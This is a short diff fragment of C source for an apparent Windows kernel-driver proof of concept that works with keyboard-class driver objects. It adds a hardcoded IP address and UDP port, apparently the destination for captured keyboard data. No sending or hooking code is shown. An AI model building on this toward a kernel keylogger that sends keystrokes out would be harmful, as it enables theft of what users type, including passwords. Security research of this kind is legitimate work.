@@ -25,6 +25,9 @@ extern POBJECT_TYPE* IoDriverObjectType;
 #define SPIN_LOCK_OFFSET_DE             0xA0
 #define READ_QUEUE_OFFSET_DE            0xA8
 
+#define POC_IP_ADDRESS                  L"192.168.10.96"
+#define POC_UDP_PORT                    L"10017"
+
 typedef struct _POC_KBDCLASS_OBJECT
 {
     LIST_ENTRY ListEntry;
